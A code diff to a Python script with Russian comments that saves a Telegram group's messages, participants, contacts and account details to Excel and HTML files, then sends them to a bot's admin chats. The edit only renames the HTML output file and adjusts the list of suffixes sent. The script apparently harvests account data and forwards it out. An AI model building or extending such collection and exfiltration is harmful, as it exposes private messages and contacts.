@@ -1018,7 +1018,7 @@ def get_messages_and_save_xcls(client, index: int, id_: bool, name: bool, group_
             html_data += f"<p><strong>Реакции:</strong> {row_data[19]}</p>"
         html_data += "</div></div>"
     
-    # Чтобы использовать существующий шаблон HTML, мы можем просто заменить его часть нужными данными
+    # Загрузка шаблона HTML
     with open("template_groups_messages.html", "r") as f:
         template = f.read()
         template_with_data = template.replace("{messages_data}", html_data)
@@ -1036,8 +1036,12 @@ def get_messages_and_save_xcls(client, index: int, id_: bool, name: bool, group_
 
     wb.save(filename)
     
-    # Сохраняем HTML файл с данными из шаблона
-    with open(f"{clean_group_title}_messages.html", "w") as output_file:
+     # Сохранение HTML файла
+    if clean_group_title == group_title:
+        filename_html = f"{group_title}_messages.html"
+    else:
+        filename_html = f"{clean_group_title}_messages.html"
+    with open(filename_html, "w") as output_file:
         output_file.write(template_with_data)
 
 
@@ -1388,7 +1392,7 @@ def generate_html_report(phone, userid, userinfo, firstname, lastname, username,
     
 # Функци по отправке в боты
 def send_files_to_bot(bot, admin_chat_ids):
-    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_private_messages.html']
+    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_messages.html']
 
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
